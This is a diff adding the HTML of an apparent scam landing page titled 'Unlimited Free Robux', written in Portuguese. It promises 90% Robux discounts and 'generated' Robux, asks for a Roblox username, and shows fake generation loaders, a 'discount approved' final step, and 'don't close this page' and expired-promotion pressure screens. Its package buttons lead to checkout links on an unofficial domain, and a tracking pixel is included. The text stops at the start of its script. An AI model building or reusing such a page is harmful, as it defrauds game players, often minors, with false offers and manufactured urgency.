@@ -1,0 +1,1327 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <script>
+        window.pixelId = "695db99fa9975703d8a4d0cc";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlimited Free Robux</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <!-- Removed external font link to ensure full control via CSS -->
+    <style>
+        /* Restoring User's Inline Styles */
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg)
+            }
+
+            to {
+                transform: rotate(359deg)
+            }
+        }
+
+        /*
+           FONT: Monument Extended Regular (Lighter weight)
+           CDN only provides Regular (400) and Ultrabold (800).
+           Using Regular as closest to 'Light'.
+        */
+        @font-face {
+            font-family: 'Monument Extended';
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://fonts.cdnfonts.com/s/19595/MonumentExtended-Regular.woff') format('woff');
+        }
+
+        /* Local Fallback for Builder Extended (Proprietary) */
+        @font-face {
+            font-family: 'Builder Extended';
+            src: url('fonts/BuilderExtended.ttf') format('truetype'),
+                url('fonts/BuilderExtended.otf') format('opentype');
+            font-weight: 700;
+            font-style: normal;
+        }
+
+        /* TYPOGRAPHY SETTINGS */
+        body {
+            font-family: 'Builder Sans', 'Segoe UI', sans-serif;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        .text-section-title,
+        .sub-header-text,
+        .price-tag,
+        .robux-price-tag,
+        .count-text {
+            /* 
+               Stack: 
+               1. Builder Extended (Primary - User must provide file)
+               2. Monument Extended (Fallback)
+               3. sans-serif
+            */
+            font-family: 'Builder Extended', 'Monument Extended', sans-serif !important;
+            font-weight: 700 !important;
+        }
+
+        /* --- PROFESSIONAL ANIMATIONS & UI UPGRADES (EDITED) --- */
+        @keyframes modalEntry {
+            0% {
+                opacity: 0;
+                transform: scale(0.95) translateY(20px);
+            }
+
+            100% {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .modal-content {
+            animation: modalEntry 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 0;
+            max-width: 500px;
+            width: 90%;
+            max-height: 85vh;
+            overflow-y: auto;
+            overflow-x: hidden;
+            box-shadow: 0 40px 80px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.1);
+            position: relative;
+            text-align: center;
+        }
+
+        .counter-box-pro {
+            background: #333333;
+            border: 3px solid #111;
+            border-radius: 16px;
+            padding: 10px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            margin: 15px auto;
+            min-width: 240px;
+            transition: all 0.3s ease;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .counter-inner-plate {
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 10px 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            justify-content: center;
+            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .counter-box-pro .count-text {
+            font-family: 'Gotham', 'Segoe UI', Tahoma, sans-serif;
+            font-size: 36px;
+            font-weight: 900;
+            color: #000000;
+            letter-spacing: -0.5px;
+        }
+
+        .counter-box-pro .icon-robux {
+            filter: drop-shadow(0 2px 2px rgba(0, 0, 0, 0.2));
+            width: 36px !important;
+            height: 36px !important;
+        }
+
+        button {
+            transition: all 0.2s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+
+        .robux-package-btn .robux-price-tag {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .robux-package-btn {
+            background: linear-gradient(180deg, #00b06f 0%, #009960 100%) !important;
+            border-bottom: 4px solid #007a4d !important;
+            border-radius: 12px !important;
+            color: white !important;
+            font-weight: 800 !important;
+            text-transform: uppercase;
+            box-shadow: 0 4px 10px rgba(0, 176, 111, 0.3);
+            cursor: pointer;
+            opacity: 1;
+            pointer-events: auto;
+            position: relative;
+            /* Ensure context for ::after */
+            overflow: hidden;
+            /* Prevent shimmer from spilling out */
+        }
+
+        .robux-package-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+            box-shadow: 0 10px 20px rgba(0, 176, 111, 0.4);
+        }
+
+        .robux-package-btn:active {
+            transform: translateY(2px);
+            border-bottom-width: 0px !important;
+        }
+
+        @keyframes pulse-gold {
+            0% {
+                box-shadow: 0 0 0 0 rgba(253, 216, 53, 0.7);
+                transform: scale(1);
+            }
+
+            70% {
+                box-shadow: 0 0 0 15px rgba(253, 216, 53, 0);
+                transform: scale(1.02);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(253, 216, 53, 0);
+                transform: scale(1);
+            }
+        }
+
+        #unlock-btn {
+            background: linear-gradient(180deg, #FFD700 0%, #FFA000 100%);
+            border-bottom: 5px solid #E65100;
+            color: #333;
+            animation: pulse-gold 2s infinite;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            font-weight: 900 !important;
+            font-size: 20px !important;
+            border-radius: 50px !important;
+            box-shadow: 0 10px 20px rgba(255, 160, 0, 0.4);
+        }
+
+        #unlock-btn:hover {
+            filter: brightness(1.1);
+            transform: translateY(-2px);
+        }
+
+        #unlock-btn:active {
+            transform: translateY(2px);
+            border-bottom-width: 0px;
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: -200% 0;
+            }
+
+            100% {
+                background-position: 200% 0;
+            }
+        }
+
+        .robux-package-btn::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 200%;
+            height: 100%;
+            background: linear-gradient(to right, transparent 0%, rgba(255, 255, 255, 0.4) 50%, transparent 100%);
+            background-size: 200% 100%;
+            animation: shimmer 3s infinite linear;
+            pointer-events: none;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            transition: opacity 0.3s ease;
+        }
+
+        .spinner-ring {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+
+        .spinner-ring div {
+            box-sizing: border-box;
+            display: block;
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            margin: -10px;
+            border: 6px solid #4CAF50;
+            border-radius: 50%;
+            animation: spinner-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            border-color: #4CAF50 transparent transparent transparent;
+        }
+
+        .spinner-ring div:nth-child(1) {
+            animation-delay: -0.45s;
+        }
+
+        .spinner-ring div:nth-child(2) {
+            animation-delay: -0.3s;
+        }
+
+        .spinner-ring div:nth-child(3) {
+            animation-delay: -0.15s;
+        }
+
+        @keyframes spinner-ring {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .professional-loading {
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .professional-loading .loading-gif {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 25px;
+            background-image: url('image/loading.gif');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .gif-wrapper {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 25px;
+        }
+
+        .gif-wrapper .spinner-ring {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1;
+        }
+
+        .professional-loading .loading-status {
+            font-size: 20px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .username-input {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f9f9f9;
+        }
+
+        .username-input:focus {
+            border-color: #2563eb;
+            background: #fff;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+        }
+
+        /* Lobby */
+        .page-wrapper-lobby {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            position: relative;
+            background: transparent;
+        }
+
+        .lobby-header {
+            position: relative;
+            width: 100%;
+            height: 220px;
+            background-image: url('image/lobby_new.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            z-index: 1;
+            border-radius: 24px 24px 0 0;
+        }
+
+        .content-container-lobby {
+            position: relative;
+            background: #fff;
+            margin-top: -40px;
+            padding-top: 10px;
+            border-radius: 25px 25px 0 0;
+            z-index: 10;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.05);
+            min-height: 250px;
+        }
+
+        .handle-bar {
+            width: 40px;
+            height: 4px;
+            background: #D5D4DE;
+            border-radius: 10px;
+            margin: 12px auto 0 auto;
+        }
+
+        .header-ui-top {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 4%;
+            z-index: 10;
+        }
+
+        .back-arrow,
+        .search-icon {
+            width: 24px;
+            height: auto;
+            object-fit: contain;
+        }
+
+        .tabs-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 3px;
+            border-radius: 10px;
+            display: flex;
+            gap: 3px;
+        }
+
+        .tab {
+            padding: 5px 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            white-space: nowrap;
+            color: #333;
+        }
+
+        .tab.active {
+            background: #ddd;
+            color: #000;
+        }
+
+        .profile-square-container {
+            position: absolute;
+            top: 60px;
+            left: 4%;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            z-index: 10;
+        }
+
+        .white-sq {
+            width: 48px;
+            height: 48px;
+            background: #fff;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 7px;
+        }
+
+        .white-sq img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .center-profile-img {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            height: 160px;
+            /* Reduced -20px again per request */
+            max-width: 80%;
+            width: auto;
+            z-index: 5;
+            /* Behind content card */
+            object-fit: contain;
+            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.2));
+            pointer-events: none;
+        }
+
+        .robux-badge {
+            position: absolute;
+            top: 60px;
+            right: 4%;
+            background: #fff;
+            padding: 0 12px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            border: 1px solid #D5D4DE;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            z-index: 10;
+            width: auto;
+            max-width: fit-content;
+        }
+
+        .robux-badge img {
+            width: 18px;
+        }
+
+        .nav-robux-amount-sync {
+            font-size: 13px;
+            font-weight: 700;
+            color: #555;
+        }
+
+        .content-padding-lobby {
+            position: relative;
+            background: #ffffff;
+            padding: 15px 15px 30px 15px;
+            text-align: center;
+            border-radius: 0 0 24px 24px;
+        }
+
+        .sub-header-text {
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            color: #000;
+            text-transform: uppercase;
+            margin: 15px 0 10px 0;
+            letter-spacing: -0.5px;
+        }
+
+        .verification-desc {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-weight: 400;
+        }
+
+        .checking-section {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .checking-text {
+            font-size: 12px;
+            font-weight: 700;
+            color: #aaa;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .dots-loader {
+            display: flex;
+            gap: 4px;
+        }
+
+        .dot {
+            width: 6px;
+            height: 6px;
+            background: #ddd;
+            border-radius: 50%;
+            animation: pulse 1.4s infinite ease-in-out both;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            80%,
+            100% {
+                transform: scale(0);
+            }
+
+            40% {
+                transform: scale(1.0);
+                background: #000;
+            }
+        }
+
+        @media (min-width: 500px) {
+            .white-sq {
+                width: 55px;
+                height: 55px;
+            }
+        }
+
+        .username-error {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            padding: 12px;
+            background-color: #ffebee;
+            border-radius: 8px;
+            border: 1px solid #ef5350;
+            font-weight: 600;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        }
+
+        /* [UPDATED] Robux Section Background Styling */
+        .robux-redesign-page .flex.flex-col.items-center {
+            position: relative;
+            width: 100%;
+        }
+
+        .buy-robux-background {
+            position: absolute;
+            top: 10px;
+            /* Moved down 10px */
+            left: -1%;
+            /* Slight overflow for full coverage */
+            width: 102%;
+            height: 355px;
+            /* Increased by 5px: 350px -> 355px */
+            /* background-color: #FFFFFF; Removed global white */
+            background-image: url('image/robux-bg.png');
+            background-size: 100% auto;
+            /* Native size, no stretching */
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: 0;
+            pointer-events: none;
+            border-radius: 20px;
+            /* Optional: adds nice rounding if visible */
+            /* Image Sharpness Improvements */
+            image-rendering: -webkit-optimize-contrast;
+            image-rendering: crisp-edges;
+            -ms-interpolation-mode: nearest-neighbor;
+            /* Improved visibility */
+            filter: brightness(1.15) contrast(1.05);
+        }
+
+        .buy-robux-content {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+        }
+
+        /* Desktop title size */
+        h1.text-section-title {
+            font-size: 41px;
+            line-height: 1.2;
+        }
+
+        /* Mobile Responsive Styles */
+        @media (max-width: 768px) {
+
+            /* Add safe margins for mobile */
+            .buy-robux-content {
+                padding-left: 20px !important;
+                padding-right: 20px !important;
+            }
+
+            /* Reduce title size on mobile - more specific selector to override inline style */
+            h1.text-section-title {
+                font-size: 28px !important;
+                line-height: 1.2 !important;
+            }
+
+            /* Ensure proper spacing for the header container */
+            .buy-robux-content .w-full.max-w-2xl {
+                padding-left: 0;
+                padding-right: 0;
+            }
+
+            /* Adjust card padding on mobile */
+            .radius-medium.stroke-standard {
+                margin-left: 0;
+                margin-right: 0;
+            }
+
+            /* Adjust robux package buttons for mobile */
+            .robux-package-btn {
+                padding: 8px 16px !important;
+                font-size: 14px !important;
+            }
+
+            /* Make robux amounts more readable on mobile */
+            .text-2xl {
+                font-size: 1.25rem !important;
+            }
+
+            /* Adjust username input section padding */
+            #username-input-section {
+                padding: 20px !important;
+            }
+
+            /* Adjust main content padding */
+            .flex.flex-col.items-start.self-stretch.gap-xlarge {
+                padding: 20px !important;
+            }
+        }
+
+
+        /* Extra small mobile devices - 6.2 inches or smaller (≤480px) */
+        @media (max-width: 480px) {
+
+            /* Further reduce title size on very small screens */
+            h1.text-section-title {
+                font-size: 24px !important;
+                line-height: 1.15 !important;
+            }
+
+            /* Increase mobile margins for safety */
+            .buy-robux-content {
+                padding-left: 16px !important;
+                padding-right: 16px !important;
+            }
+
+            /* Buttons remain horizontal on all screens - no vertical stacking */
+        }
+    </style>
+</head>
+
+<body class="bg-white robux-redesign-page" style="margin-top: -60px; background-color: #FFFFFF !important;">
+
+    <div id="wrap" class="wrap no-gutter-ads logged-in">
+        <main class="container-main content-no-ads" id="container-main" tabindex="-1">
+            <div class="content" id="content">
+                <div id="robux-redesign-page" class="robux-redesign-page">
+                    <div class="flex flex-col items-center">
+
+                        <div class="buy-robux-content padding-x-xlarge">
+                            <!-- Unified Container: Header + Card (Aligned & Centered) -->
+                            <div class="w-full max-w-2xl mx-auto relative flex flex-col items-start">
+
+                                <!-- Background: Behind Header Area Only -->
+                                <div class="buy-robux-background"></div>
+
+                                <!-- Header Region -->
+                                <div
+                                    class="flex flex-col justify-start items-start gap-small self-stretch padding-top-xlarge padding-bottom-medium medium:padding-y-xxlarge medium:gap-large pt-24 pb-6 relative z-10">
+                                    <h1 class="self-stretch text-align-x-left text-section-title content-emphasis padding-y-none text-left"
+                                        style="font-family: 'Monument Extended', sans-serif !important; font-weight: 400 !important; margin-top: 4px;">
+                                        Aproveite até 90% em desconto nos Robux</h1>
+                                    <div
+                                        class="self-stretch text-align-x-left text-section-subtitle text-body-large text-left mt-2">
+                                        Escolha seu pacote abaixo e receba os Robux <strong>diretamente na sua conta
+                                            Roblox</strong>.</div>
+                                </div>
+
+                                <!-- Card Region -->
+                                <div data-slot="card"
+                                    class="self-stretch flex flex-col items-start gap-medium w-full relative z-10">
+                                    <!-- Card Content -->
+                                    <div class="radius-medium stroke-standard stroke-default flex flex-col items-start self-stretch rounded-xl shadow-md relative"
+                                        style="background-color: white;">
+
+                                        <div id="username-input-section"
+                                            class="flex flex-col self-stretch padding-medium medium:padding-xlarge p-6"
+                                            style="padding-bottom: 0 !important; border-bottom: 1px solid #eee;">
+                                            <div
+                                                class="flex flex-row justify-start items-center self-stretch gap-small mb-4">
+                                                <span class="icon-nav-profile"></span>
+                                                <span class="text-heading-small content-emphasis font-bold text-lg">1.
+                                                    Confirme seu
+                                                    nome de usuário</span>
+                                            </div>
+                                            <div
+                                                class="flex flex-col self-stretch gap-medium text-body-medium content-emphasis mb-6">
+                                                <input id="username-input" type="text" class="username-input"
+                                                    placeholder="Digite seu nome de usuário do Roblox..." maxlength="50"
+                                                    style="width: 100%;">
+                                                <div id="username-error" class="username-error" style="display: none;">
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div
+                                            class="flex flex-col items-start self-stretch gap-xlarge padding-medium medium:padding-xlarge p-6 w-full">
+                                            <div class="flex flex-row justify-start items-center self-stretch gap-small"
+                                                style="margin-bottom: 15px;">
+                                                <span class="icon-filled-robux"></span>
+                                                <span class="text-heading-small content-emphasis font-bold text-lg">2.
+                                                    Selecione a Quantidade a Gerar</span>
+                                            </div>
+
+                                            <!-- 24,000 -->
+                                            <div
+                                                class="self-stretch flex flex-row justify-between items-center gap-small mb-4 w-full">
+                                                <div class="flex flex-col justify-start">
+                                                    <div class="flex flex-row justify-start items-center gap-small">
+                                                        <div class="flex flex-row justify-start items-center gap-2">
+                                                            <img src="image/robux-icon.png" class="w-8 h-8">
+                                                            <span class="text-2xl font-bold">24,000</span>
+                                                        </div>
+                                                        <div
+                                                            class="flex flex-row justify-start items-center ml-4 text-gray-400 gap-1">
+                                                            <img src="image/robux-icon.png" class="w-4 h-4 opacity-50">
+                                                            <span class="line-through">22,500</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <button type="button" class="robux-package-btn px-6 py-2 rounded-lg"
+                                                    data-robux-amount="24000">
+                                                    <span class="robux-price-tag font-bold">R$ 37,90</span>
+                                                </button>
+                                            </div>
+
+                                            <!-- 11,000 -->
+                                            <div
+                                                class="self-stretch flex flex-row justify-between items-center gap-small mb-4 w-full">
+                                                <div class="flex flex-col justify-start">
+                                                    <div class="flex flex-row justify-start items-center gap-small">
+                                                        <div class="flex flex-row justify-start items-center gap-2">
+                                                            <img src="image/robux-icon.png" class="w-8 h-8">
+                                                            <span class="text-2xl font-bold">11,000</span>
+                                                        </div>
+                                                        <div
+                                                            class="flex flex-row justify-start items-center ml-4 text-gray-400 gap-1">
+                                                            <img src="image/robux-icon.png" class="w-4 h-4 opacity-50">
+                                                            <span class="line-through">10,000</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <button type="button" class="robux-package-btn px-6 py-2 rounded-lg"
+                                                    data-robux-amount="11000">
+                                                    <span class="robux-price-tag font-bold">R$ 29,90</span>
+                                                </button>
+                                            </div>
+
+                                            <!-- 5,250 -->
+                                            <div
+                                                class="self-stretch flex flex-row justify-between items-center gap-small mb-4 w-full">
+                                                <div class="flex flex-col justify-start">
+                                                    <div class="flex flex-row justify-start items-center gap-small">
+                                                        <div class="flex flex-row justify-start items-center gap-2">
+                                                            <img src="image/robux-icon.png" class="w-8 h-8">
+                                                            <span class="text-2xl font-bold">5,250</span>
+                                                        </div>
+                                                        <div
+                                                            class="flex flex-row justify-start items-center ml-4 text-gray-400 gap-1">
+                                                            <img src="image/robux-icon.png" class="w-4 h-4 opacity-50">
+                                                            <span class="line-through">4,500</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <button type="button" class="robux-package-btn px-6 py-2 rounded-lg"
+                                                    data-robux-amount="5250">
+                                                    <span class="robux-price-tag font-bold">R$ 19,90</span>
+                                                </button>
+                                            </div>
+
+                                            <!-- 2,000 -->
+                                            <div
+                                                class="self-stretch flex flex-row justify-between items-center gap-small w-full">
+                                                <div class="flex flex-col justify-start">
+                                                    <div class="flex flex-row justify-start items-center gap-small">
+                                                        <div class="flex flex-row justify-start items-center gap-2">
+                                                            <img src="image/robux-icon.png" class="w-8 h-8">
+                                                            <span class="text-2xl font-bold">2,000</span>
+                                                        </div>
+                                                        <div
+                                                            class="flex flex-row justify-start items-center ml-4 text-gray-400 gap-1">
+                                                            <img src="image/robux-icon.png" class="w-4 h-4 opacity-50">
+                                                            <span class="line-through">1,700</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <button type="button" class="robux-package-btn px-6 py-2 rounded-lg"
+                                                    data-robux-amount="2000">
+                                                    <span class="robux-price-tag font-bold">R$ 14,90</span>
+                                                </button>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+        </main>
+    </div>
+    <footer style="color:#555; font-size:12px; text-align:center; padding:15px 10px;">
+        This website is not affiliated with, endorsed by, or sponsored by Roblox Corporation.
+    </footer>
+
+    <!-- Modals -->
+    <div id="professional-loading-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content" style="max-width: 450px;">
+            <div class="professional-loading">
+                <div class="gif-wrapper">
+                    <div class="spinner-ring">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                    <div class="loading-gif"></div>
+                </div>
+                <div id="loading-status" class="loading-status"></div>
+                <div style="color: #666; font-size: 14px; margin-top: 20px; font-weight: 500;">Por favor, aguarde
+                    enquanto
+                    geramos seu pacote...</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="last-step-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content">
+            <div class="page-wrapper-lobby">
+                <div class="lobby-header">
+                    <div class="header-ui-top">
+                        <img src="image/arrow.png" class="back-arrow" alt="Back" onclick="showExitWarning()"
+                            style="cursor:pointer;">
+                        <div class="tabs-container">
+                            <div class="tab active">Mercado</div>
+                            <div class="tab">Personalizar</div>
+                        </div>
+                        <img src="image/search_new.png" class="search-icon" alt="Search">
+                    </div>
+
+                    <div class="profile-square-container">
+                        <div class="white-sq">
+                            <img class="user-avatar-sync" src="" alt="">
+                        </div>
+                        <div class="white-sq">
+                            <img src="image/setting_new.png" alt="Settings">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="robux-badge">
+                    <img src="image/robux_new.png">
+                    <span class="nav-robux-amount-sync">0</span>
+                    <span
+                        style="font-size: 10px; color: #999; margin-left: 5px; font-weight: 700; text-transform: uppercase; display:flex; align-items:center; gap:3px;">
+                        BLOQUEADO
+                    </span>
+                </div>
+
+                <img class="center-profile-img user-avatar-sync" src="" alt="">
+            </div>
+
+            <div class="content-container-lobby">
+                <div class="handle-bar"></div>
+                <div class="content-padding-lobby">
+                    <h1 class="sub-header-text"
+                        style="font-family: 'Monument Extended', sans-serif !important; font-weight: 400 !important;">
+                        ÚLTIMO PASSO</h1>
+
+                    <h2
+                        style="font-size: 20px; font-weight: 700; color: #333; margin: 0 0 20px 0; font-family: 'Builder Sans', 'Segoe UI', sans-serif !important;">
+                        <span class="nav-robux-amount-sync"
+                            style="color:#00b06f; font-size: inherit !important;"></span> para <span
+                            class="username-text-dynamic" style="color:#000;"></span>
+                    </h2>
+
+                    <div class="verification-desc">
+                        <p style="margin: 0 0 15px 0; font-size: 15px;">
+                            <strong style="color: #00b06f;">Parabéns!</strong> Seu desconto de 90% foi aprovado com
+                            sucesso.
+                        </p>
+                        <p style="margin: 0 0 15px 0;">
+                            Agora só falta confirmar o pedido para garantir seus
+                            <strong class="nav-robux-amount-sync" style="color:#00b06f;"></strong> imediatos na sua
+                            conta.
+                        </p>
+                        <p style="margin: 0 0 20px 0;">
+                            Clique abaixo e <strong>FINALIZE O PAGAMENTO SEGURO</strong> antes que o desconto expire.
+                        </p>
+                    </div>
+
+                    <div class="unlock-btn-container" style="margin-bottom: 20px;">
+                        <button id="unlock-btn" onclick="openCheckout()"
+                            class="foundation-web-button relative clip group/interactable focus-visible:outline-focus disabled:outline-none cursor-pointer relative flex items-center justify-center stroke-none padding-y-none select-none radius-medium text-label-medium height-1000 padding-x-medium width-full"
+                            style="text-decoration: none; max-width: 340px; margin: 0 auto; padding: 20px;">
+                            <div role="presentation" class="absolute inset-[0]"></div>
+                            <span class="padding-y-xsmall"
+                                style="letter-spacing: 1px; text-align: center; line-height: 1.3;">
+                                FINALIZAR PAGAMENTO E ATIVAR MEUS <span class="nav-robux-amount-sync"
+                                    style="color: inherit; font-size: inherit; font-weight: inherit;"></span>
+                            </span>
+                        </button>
+                    </div>
+
+                    <div
+                        style="font-size: 11px; color: #d32f2f; font-weight: 700; margin-top: 15px; text-transform: uppercase; letter-spacing: 0.5px;">
+                        Não feche esta janela até a confirmação do pagamento ser concluída.
+                    </div>
+
+                    <div class="checking-section">
+                        <div class="checking-text">aguardando pagamento...</div>
+                        <div class="dots-loader">
+                            <div class="dot"></div>
+                            <div class="dot" style="animation-delay: -0.16s;"></div>
+                            <div class="dot" style="animation-delay: -0.32s;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <!-- Exit Warning Modal -->
+    <div id="exit-warning-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content" style="max-width: 350px; padding: 30px; text-align: center;">
+            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
+            <p style="font-size: 16px; font-weight: 600; color: #333; margin: 0 0 20px 0;">
+                Não feche esta página. Fechar agora pode cancelar o desconto.
+            </p>
+            <div style="display: flex; justify-content: center; width: 100%;">
+                <button type="button" onclick="$('#exit-warning-modal').hide();"
+                    class="robux-package-btn px-6 py-2 rounded-lg" style="min-width: 180px;">
+                    <span class="robux-price-tag font-bold" id="exit-warning-btn-text">CONTINUAR</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Promotion Expired Modal -->
+    <div id="promotion-expired-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content" style="max-width: 400px; padding: 40px; text-align: center;">
+            <div style="font-size: 60px; margin-bottom: 20px;">❌</div>
+            <h2 style="font-size: 24px; font-weight: 700; color: #d32f2f; margin: 0 0 15px 0;">
+                Promoção Encerrada
+            </h2>
+            <p style="font-size: 16px; color: #666; margin: 0 0 25px 0;">
+                Infelizmente o desconto de 90% expirou. Atualize a página para tentar novamente.
+            </p>
+            <button onclick="location.reload();" class="robux-package-btn px-6 py-2 rounded-lg"
+                style="min-width: 200px;">
+                <span class="robux-price-tag font-bold">ATUALIZAR PÁGINA</span>
+            </button>
+        </div>
+    </div>
+
+    <div id="offers-modal" class="modal-overlay" style="display: none;">
+        <div class="modal-content text-center p-5">
+            <h2>Complete uma Oferta para Obter <span id="selected-robux-amount"
+                    style="color:#00b06f; font-weight:bold;"></span> robux</h2>
+            <div class="offer-complete-message mb-4">
+                Complete uma das ofertas abaixo para receber sua recompensa de <span id="offer-robux-amount"
+                    style="font-weight:bold;"></span> robux!
+            </div>
+
+            <div class="try-again-container">
+                <button id="try-again-btn" class="bg-blue-500 text-white px-4 py-2 rounded">Verificar Ofertas
+                    Completadas</button>
+            </div>
+            <div id="checking-status" class="checking-status mt-3 text-gray-500" style="display: none;">
+                <span>Verificando ofertas completadas...</span>
+            </div>
+            <div id="completion-message" class="mt-3"></div>
+
+            <button id="close-offers" class="bg-gray-200 text-gray-700 px-4 py-2 rounded mt-5">Fechar</button>
+        </div>
+    </div>
+
+    <script type="text/javascript">
+        // Global variable to store selected robux amount
+        var selectedRobuxAmount = 0;
+        var backClickCount = 0; // Track number of back button clicks
+        var promotionExpired = false; // Track if promotion has expired
+
+        // Function to get checkout URL based on Robux amount
+        function getCheckoutUrl(amount) {
+            var checkoutUrls = {
+                2000: 'https://pay.robuxupdates.fun/checkout?product=1c7cd6b3-e9fb-11f0-b2a5-46da4690ad53',  // R$ 14,90
+                5250: 'https://pay.robuxupdates.fun/checkout?product=2d99e2a6-e9fb-11f0-b2a5-46da4690ad53',  // R$ 19,90
+                11000: 'https://pay.robuxupdates.fun/checkout?product=417bfc90-e9fb-11f0-b2a5-46da4690ad53', // R$ 29,90
+                24000: 'https://pay.robuxupdates.fun/checkout?product=5d8c7511-e9fb-11f0-b2a5-46da4690ad53'  // R$ 37,90
+            };
+            return checkoutUrls[amount] || 'https://pay.robuxupdates.fun/checkout';
+        }
+
+        // Function to show exit warning popup (progressive warnings)
+        function showExitWarning() {
